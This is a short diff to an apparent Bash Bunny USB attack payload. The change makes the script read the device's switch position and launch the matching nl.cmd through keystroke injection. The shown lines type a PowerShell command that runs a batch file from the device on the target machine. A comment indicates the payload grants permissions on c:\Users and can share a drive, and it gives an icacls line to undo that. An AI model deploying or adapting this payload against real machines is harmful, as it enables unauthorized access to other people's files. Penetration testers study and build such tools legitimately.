@@ -12,6 +12,9 @@
 # For testing use: 'icacls "c:\Users" /remove:g Everyone /T' to remove the created security permissions
 # To share a drive change the path in nl.cmd to c: remove the quotes
 
+LED SETUP
+GET SWITCH_POSITION
+
 LED STAGE1
 
 ATTACKMODE HID
@@ -32,7 +35,7 @@ LED STAGE2
 ATTACKMODE HID STORAGE
 
 # Start nl.cmd
-Q STRING ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch1\nl.cmd')"
+Q STRING ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\${SWITCH_POSITION}\nl.cmd')"
 Q ENTER
 
 # Wait for nl.cmd and exit
